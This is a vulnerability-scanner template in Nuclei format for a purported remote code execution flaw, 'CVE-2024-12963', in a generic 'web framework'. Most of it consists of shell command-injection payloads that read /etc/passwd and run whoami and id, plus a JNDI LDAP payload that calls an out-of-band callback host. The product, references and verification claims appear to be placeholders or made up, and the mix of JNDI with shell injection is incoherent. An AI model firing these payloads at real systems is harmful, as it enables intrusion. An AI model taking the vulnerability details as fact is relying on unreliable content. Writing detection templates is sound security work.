id: CVE-2024-12963

info:
  name: Web Application Framework < 2.1.0 - Remote Code Execution
  author: pdresearch
  severity: critical
  description: |
    Improper input validation in JSON payloads allows remote attackers to inject commands through the /api/process endpoint. The vulnerability exists in web application framework versions prior to 2.1.0, enabling remote code execution via command injection in request processing.
  impact: |
    Successful exploitation allows remote attackers to execute arbitrary commands on the affected system, potentially leading to complete system compromise, data theft, and unauthorized access.
  remediation: |
    Upgrade to version 2.1.0 or later. Implement strict input validation and sanitization for all user inputs, especially in JSON processing components.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-12963
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-12963
    - https://github.com/example/CVE-2024-12963-PoC
    - https://www.exploit-db.com/exploits/example
    - https://vendor-advisory.example.com/CVE-2024-12963
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2024-12963
    cwe-id: CWE-78,CWE-94
    epss-score: 0.95000
    epss-percentile: 0.99950
    cpe: cpe:2.3:a:web_framework:web_framework:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 4
    vendor: web_framework
    product: web_framework
    shodan-query: 'http.title:"Web Framework"'
    fofa-query: 'title="Web Framework"'
  tags: cve,cve2024,rce,injection,kev,oast

variables:
  # Command injection payloads
  cmd_payload1: "';cat /etc/passwd;'"
  cmd_payload2: "|whoami"
  cmd_payload3: "`id`"
  cmd_payload4: "$(whoami)"
  # JNDI injection payload
  jndi_payload: "${jndi:ldap://{{interactsh-url}}/a}"
  # Alternative injection patterns
  alt_injection1: "||whoami"
  alt_injection2: "&&id"
  alt_injection3: ";cat /etc/passwd"

http:
  # First request - Basic detection and version extraction
  - method: GET
    path:
      - "{{BaseURL}}/"
      - "{{BaseURL}}/api/"
      - "{{BaseURL}}/api/process"
      - "{{BaseURL}}/status"
      - "{{BaseURL}}/version"

    matchers:
      - type: word
        part: body
        words:
          - "Web Framework"
          - "API Endpoint"
          - "Process Request"
          - "Framework v"
        condition: or

    extractors:
      - type: regex
        part: body
        name: version
        group: 1
        regex:
          - "(?i)version.*?([\\d\\.]+)"
          - "(?i)framework.*?([\\d\\.]+)"
          - "(?i)v([\\d\\.]+)"

  # Second request - Command injection via JSON payload (whoami)
  - method: POST
    path:
      - "{{BaseURL}}/api/process"
      - "{{BaseURL}}/api/execute"
      - "{{BaseURL}}/process"

    headers:
      Content-Type: application/json
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

    payloads:
      action:
        - "execute"
        - "process"
        - "run"
        - "command"
      data:
        - "{{cmd_payload2}}"
        - "{{alt_injection1}}"
        - "{{alt_injection2}}"
      format:
        - "shell"
        - "command"
        - "exec"

    attack: clusterbomb

    matchers:
      - type: dsl
        dsl:
          - 'contains(body, "root:")'
          - 'contains(body, "uid=")'
          - 'contains(body, "gid=")'
          - 'contains(body, "whoami")'
          - 'contains(body, "Command executed")'
          - 'contains(body, "Process completed")'
          - 'contains(body, "Execution successful")'
        condition: or

      - type: status
        status:
          - 200

  # Third request - File reading command injection (/etc/passwd)
  - method: POST
    path:
      - "{{BaseURL}}/api/process"
      - "{{BaseURL}}/api/execute"

    headers:
      Content-Type: application/json
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

    payloads:
      action:
        - "execute"
        - "process"
      data:
        - "{{cmd_payload1}}"
        - "{{alt_injection3}}"
      format:
        - "shell"
        - "command"

    attack: clusterbomb

    matchers:
      - type: dsl
        dsl:
          - 'contains(body, "root:")'
          - 'contains(body, "bin:")'
          - 'contains(body, "daemon:")'
          - 'contains(body, "sys:")'
          - 'contains(body, "sync:")'
        condition: or

      - type: status
        status:
          - 200

  # Fourth request - JNDI injection for out-of-band detection
  - raw:
      - |
        POST /api/process HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
        Connection: close

        {
          "action": "execute",
          "data": "{{jndi_payload}}",
          "format": "jndi"
        }

    matchers:
      - type: dsl
        dsl:
          - 'contains(interactsh_protocol, "dns")'
          - 'contains(interactsh_protocol, "http")'
        condition: or

  # Fifth request - System information command (id)
  - method: POST
    path:
      - "{{BaseURL}}/api/process"

    headers:
      Content-Type: application/json
      User-Agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

    payloads:
      action:
        - "execute"
        - "process"
      data:
        - "{{cmd_payload3}}"
        - "{{cmd_payload4}}"
      format:
        - "shell"
        - "command"

    attack: clusterbomb

    matchers:
      - type: dsl
        dsl:
          - 'contains(body, "uid=")'
          - 'contains(body, "gid=")'
          - 'contains(body, "groups=")'
          - 'contains(body, "id")'
        condition: or

      - type: regex
        part: body
        regex:
          - "uid=[0-9]+"
          - "gid=[0-9]+"
          - "groups=[0-9,]+"

# digest: 490a0046304402202bb9c49bbd0a1f29f07003eb92c55fb261c7030b56a1761d548c7bb5939690c002203e8f3a50a253c5f031c332404f3ce89192f3c5cd946f682e98099545e91f0440:922c64590222798bb761d5b6d8e72950
